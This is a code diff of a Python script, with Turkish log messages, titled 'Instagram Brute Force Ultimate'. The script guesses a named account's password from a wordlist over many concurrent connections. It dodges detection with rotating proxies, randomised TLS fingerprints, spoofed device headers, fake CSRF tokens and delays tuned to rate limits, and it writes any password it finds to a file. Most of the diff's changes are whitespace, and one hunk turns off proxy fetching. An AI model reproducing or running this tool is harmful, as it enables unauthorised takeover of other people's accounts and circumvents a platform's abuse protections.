@@ -21,26 +21,37 @@ logging.basicConfig(
 logging.getLogger('asyncio').setLevel(logging.DEBUG)
 logging.getLogger('aiohttp').setLevel(logging.DEBUG)
 logger=logging.getLogger(__name__)
+
 try:from Crypto.Cipher import AES,PKCS1_v1_5;from Crypto.PublicKey import RSA;from Crypto.Random import get_random_bytes;from Crypto.Util.Padding import pad,unpad
+
 except:os.system('pip install pycryptodome --quiet');from Crypto.Cipher import AES;from Crypto.Util.Padding import pad,unpad
+
 try:from fake_useragent import UserAgent;ua=UserAgent(fallback='Mozilla/5.0')
+
 except:ua=None
+
 try:import socks
+
 except:os.system('pip install pysocks --quiet');import socks
+
 try:import dns.resolver
+
 except:os.system('pip install dnspython --quiet');import dns.resolver
+
 logger.info("Tüm modüller yüklendi")
 
-
 class MemoryManager:
+  
     def __init__(self):
         self._cleanup_handlers=[]
         logger.debug("MemoryManager başlatıldı")
   
+    
     def register(self,obj):
         self._cleanup_handlers.append(weakref.ref(obj))
         logger.debug(f"Nesne kaydedildi: {obj}")
- 
+   
+    
     def cleanup(self):
         logger.info("Memory cleanup başlatılıyor...")
         for ref in self._cleanup_handlers:
@@ -49,6 +60,7 @@ class MemoryManager:
                 with suppress(Exception):
                     obj.close()
                     logger.debug(f"Nesne kapatıldı: {obj}")
+     
         gc.collect()
         logger.info("Memory cleanup tamamlandı")
 mem_mgr=MemoryManager()
@@ -61,6 +73,8 @@ class AdvancedTLSAdapter:
         '771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-5-10-11-13-16-17-18-23-27-35-43-45-51-17513-65281,29-23-24,0',
         '771,4865-4867-4866-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-23-65281-10-11-35-16-5-13-18-51-45-43-27-17513-18,29-23-24,0'
     ]
+    
+   
     @classmethod
     def create_ssl_context(cls):
         ctx=ssl.create_default_context()
@@ -72,10 +86,10 @@ class AdvancedTLSAdapter:
         ctx.options|=ssl.OP_SINGLE_ECDH_USE
         logger.debug(f"SSL context oluşturuldu: {ctx.get_ciphers()[:3]}")
         return ctx
-
-    
+ 
 class ProxyRotator:
-    def __init__(self):
+    
+      def __init__(self):
         self.alive_proxies=deque(maxlen=200)
         self.dead_proxies={}
         self.proxy_stats=defaultdict(lambda:{'success':0,'fail':0,'latency':[]})
@@ -83,9 +97,11 @@ class ProxyRotator:
         self.last_refresh=0
         logger.info("ProxyRotator başlatıldı")
         self._fetch_real_proxies()
-
-    def _fetch_real_proxies(self):
-        logger.info("Gerçek proxy'ler fetch ediliyor...")
+    
+      def _fetch_real_proxies(self):
+          return # Şimdilik Bu Kısmı Atlıyoruz!
+        
+        
         import requests as sync_requests
         sources=[
             'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=5000&country=all&ssl=all&anonymity=elite',
@@ -111,7 +127,7 @@ class ProxyRotator:
         for proxy in real_proxies[:100]:
             self.alive_proxies.append(proxy)
         logger.info(f"Toplam {len(self.alive_proxies)} gerçek proxy havuza eklendi")
-
+    
     async def get_proxy(self):
         async with self.lock:
             if self.alive_proxies:
@@ -128,7 +144,7 @@ class ProxyRotator:
             if len(self.proxy_stats[proxy_url]['latency'])>10:
                 self.proxy_stats[proxy_url]['latency'].pop(0)
             logger.debug(f"Proxy başarılı: {proxy_url} | Latency: {latency:.3f}s")
-   
+  
     async def mark_failure(self,proxy_url):
         async with self.lock:
             if proxy_url in self.proxy_stats:
@@ -140,14 +156,15 @@ class ProxyRotator:
                     self.alive_proxies=[p for p in self.alive_proxies if p['url']!=proxy_url]
                     logger.warning(f"Proxy ölü olarak işaretlendi: {proxy_url}")
 
-    
+
 class SmartHeaderGenerator:
+ 
     def __init__(self):
         self.app_ids=[936619743392459,1217981644879628,124024574287414,567067343352427]
         self.capabilities_base=['3brTvwE=','3brTPwE=','3brTvw=='+base64.b64encode(os.urandom(32)).decode()[:8]]
         self.device_ids=[str(uuid.uuid4()).upper() for _ in range(10)]
         logger.debug(f"Header generator başlatıldı - {len(self.device_ids)} device ID")
-    
+   
     def generate(self):
         headers={
             'User-Agent':ua.random if ua else'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
@@ -190,10 +207,12 @@ class SmartHeaderGenerator:
 
 class PasswordEncryptor:
     ENCRYPTION_VERSIONS=[0,4,5,10,11,12]
+    
     def __init__(self):
         self.public_key_id_cache={}
         logger.debug("PasswordEncryptor başlatıldı")
-   
+ 
+    
     def _get_public_key(self,version):
         if version in self.public_key_id_cache:
             return self.public_key_id_cache[version]
@@ -202,7 +221,8 @@ class PasswordEncryptor:
         self.public_key_id_cache[version]=key_data
         logger.debug(f"Public key oluşturuldu - Version: {version}, ID: {key_id}")
         return key_data
-
+   
+    
     def encrypt(self,password):
         version=random.choice(self.ENCRYPTION_VERSIONS)
         ts=int(time.time())
@@ -210,6 +230,7 @@ class PasswordEncryptor:
             encrypted=f"#PWD_INSTAGRAM_BROWSER:0:{ts}:{password}"
             logger.debug(f"Şifre versiyon 0 ile şifrelendi")
             return encrypted
+     
         elif version in[4,5,10,11,12]:
             key_data=self._get_public_key(version)
             iv=os.urandom(12)
@@ -220,11 +241,13 @@ class PasswordEncryptor:
             result=f"#PWD_INSTAGRAM:{version}:{ts}:{base64.b64encode(combined).decode()}"
             logger.debug(f"Şifre versiyon {version} ile şifrelendi (AES-GCM)")
             return result
+     
         encrypted=f"#PWD_INSTAGRAM_BROWSER:0:{ts}:{password}"
         logger.debug(f"Şifre default versiyon ile şifrelendi")
         return encrypted
 
 class InstagramBruteForceUltimate:
+    
     def __init__(self,username,wordlist_path,threads=100,distributed=False):
         self.username=username
         self.wordlist_path=wordlist_path
@@ -254,6 +277,7 @@ class InstagramBruteForceUltimate:
         self.cb_timeout=60
         self.last_cb_open=0
         logger.info(f"InstagramBruteForceUltimate başlatıldı - Hedef: {username}, Thread: {threads}")
+   
     
     async def _create_session(self):
         if self.connector is None:
@@ -271,6 +295,7 @@ class InstagramBruteForceUltimate:
         session=aiohttp.ClientSession(connector=self.connector,timeout=timeout,trust_env=True)
         logger.debug("ClientSession oluşturuldu")
         return session
+  
     
     async def _check_circuit_breaker(self):
         if self.circuit_breaker:
@@ -287,7 +312,8 @@ class InstagramBruteForceUltimate:
             logger.error(f"Circuit breaker AÇILDI! ({self.cb_failures} hata)")
             return False
         return True
- 
+  
+    
     async def _fetch_csrf(self,session):
         try:
             async with session.get('https://www.instagram.com/',ssl=False)as resp:
@@ -300,7 +326,8 @@ class InstagramBruteForceUltimate:
         fake_csrf=hashlib.md5(os.urandom(16)).hexdigest()[:32]
         logger.debug(f"Sahte CSRF oluşturuldu: {fake_csrf[:10]}...")
         return fake_csrf
-
+   
+    
     async def _adaptive_delay(self):
         async with self.lock:
             speed=self.attempt_count/(time.time()-self.start_time+1)
@@ -322,23 +349,20 @@ class InstagramBruteForceUltimate:
             async with self.lock:
                 self.rate_limit_count=0
             logger.warning(f"Rate limit nedeniyle uzun bekleme: {delay:.2f}s")
-  
+   
+    
     async def _handle_response(self,response_text,status,password,proxy_url,latency):
         logger.debug(f"Yanıt işleniyor - Status: {status}, Şifre: {password[:10]}...")
         if status==200:
             if'"authenticated":true'in response_text or'"userId":'in response_text:
                 async with self.lock:
                     self.success_count+=1
-              
                 logger.critical(f"🔥 BAŞARILI GİRİŞ! Kullanıcı: {self.username}, Şifre: {password}")
-               
                 print(f"\n{'='*70}\n🔥🔥🔥 BAŞARILI GİRİŞ 🔥🔥🔥\nHesap: {self.username}\nŞifre: {password}\nZaman: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\nDeneme: {self.attempt_count}\n{'='*70}\n")
-             
                 with open(f'SUCCESS_{self.username}_{int(time.time())}.txt','w',encoding='utf-8')as f:
                     f.write(f"Username: {self.username}\nPassword: {password}\nTimestamp: {datetime.now()}\nAttempt: {self.attempt_count}\nResponse: {response_text[:500]}")
                 self.found.set()
                 return True
-         
             elif'checkpoint_required'in response_text:
                 logger.warning(f"Checkpoint tespit edildi - Şifre: {password[:10]}...")
                 print(f"[⚠] {password[:20]:20} | CHECKPOINT - Hesap korumalı")
@@ -379,6 +403,7 @@ class InstagramBruteForceUltimate:
                 await self.proxy_rotator.mark_failure(proxy_url)
         return False
   
+    
     async def attempt_login(self,password,session):
         if self.found.is_set():
             return False
@@ -429,9 +454,9 @@ class InstagramBruteForceUltimate:
                     self.fail_count+=1
                 if proxy_url:
                     await self.proxy_rotator.mark_failure(proxy_url)
-  
                 return False
   
+    
     async def _worker(self,password_queue,session):
         logger.debug(f"Worker başlatıldı - Session: {id(session)}")
         while not self.found.is_set():
@@ -445,6 +470,7 @@ class InstagramBruteForceUltimate:
                 break
         logger.debug(f"Worker sonlandı - Session: {id(session)}")
  
+    
     async def execute_async(self):
         try:
             with open(self.wordlist_path,'r',encoding='utf-8',errors='ignore')as f:
@@ -456,16 +482,16 @@ class InstagramBruteForceUltimate:
         random.shuffle(passwords)
         print(f"""
 ╔══════════════════════════════════════════════════════════════════╗
-║       INSTAGRAM BRUTE FORCE ULTIMATE - MIRMEL            ║
+║       INSTAGRAM BRUTE FORCE ULTIMATE - MIRMEL           ║
 ╠══════════════════════════════════════════════════════════════════╣
 ║ Hedef          : {self.username:<50}║
 ║ Thread (Async) : {self.threads:<50}║
 ║ Wordlist       : {os.path.basename(self.wordlist_path):<50}║
 ║ Toplam Şifre   : {len(passwords):<50}║
 ║ Proxy Havuzu   : {len(self.proxy_rotator.alive_proxies):<50}║
-║ TLS Bypass     : AKTİF (JA3 Randomizer)                     ║
-║ Circuit Breaker: AKTİF                                      ║
-║ Debug Logging  : AKTİF (ig_brute_debug.log)                 ║
+║ TLS Bypass     : AKTİF (JA3 Randomizer)                        ║
+║ Circuit Breaker: AKTİF                                        ║
+║ Debug Logging  : AKTİF (ig_brute_debug.log)                  ║
 ╚══════════════════════════════════════════════════════════════════╝
 """)
         self.start_time=time.time()
@@ -491,7 +517,8 @@ class InstagramBruteForceUltimate:
         if not self.found.is_set():
             logger.info(f"İşlem tamamlandı - {self.attempt_count} deneme sonuçsuz")
             print(f"\n[!] {self.attempt_count} deneme sonuçsuz kaldı.")
-
+  
+    
     def execute(self):
         if platform.system()=='Windows':
             asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
